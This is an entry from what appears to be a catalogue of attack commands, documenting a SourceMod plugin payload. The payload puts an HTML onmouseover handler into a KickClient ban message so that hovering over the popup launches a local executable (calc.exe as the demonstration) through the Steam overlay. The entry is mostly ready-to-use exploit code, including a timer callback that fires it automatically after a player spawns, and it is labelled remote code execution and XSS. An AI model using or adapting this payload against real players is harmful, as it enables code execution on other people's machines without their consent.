---
id: cmd-sourcemod-autokick-001
data: >-
  KickClient(client, "<a
  onmouseover=\"javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')\">-------------------------\nBANNED\n-------------------------\n\nYour
  account has been banned from this community.\n\nThe ban is non
  negotiable</a>");
tags:
  - rce
  - auto
  - xss
type: command
output: RCE triggered automatically on mouse hover post-spawn
executor: sourcemod-plugin
platforms:
  - Windows
  - Game
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:14.822Z'
verified: false
validated: true
submitted: true
---
# kickclient-with-ban-payload

## Command

```bash
# In autokick.smx plugin, called after 0.1s timer on player_spawned
KickClient(client, "<a onmouseover=\"javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')\">-------------------------\nBANNED\n-------------------------\n\nYour account has been banned from this community.\n\nThe ban is non negotiable</a>");
```

## Description

Kicks the spawned client with an escaped HTML ban message payload, triggering XSS RCE automatically as the mouse hovers over the centered popup text.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| client | Spawned player index | Yes |
| message | Escaped HTML payload for ban popup | Yes |

## Examples

### Basic Usage

```bash
KickClient(client, "<escaped payload>");
```

### Advanced Usage

In timer callback:

```bash
public Action Timer_Kick(Handle timer, int client) {
    KickClient(client, "<a onmouseover=\"javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')\">BANNED</a>");
    return Plugin_Stop;
}
```

## Expected Output

Ban popup displays; RCE executes on default hover.

## Related

- [[commands/kickclient-function]]
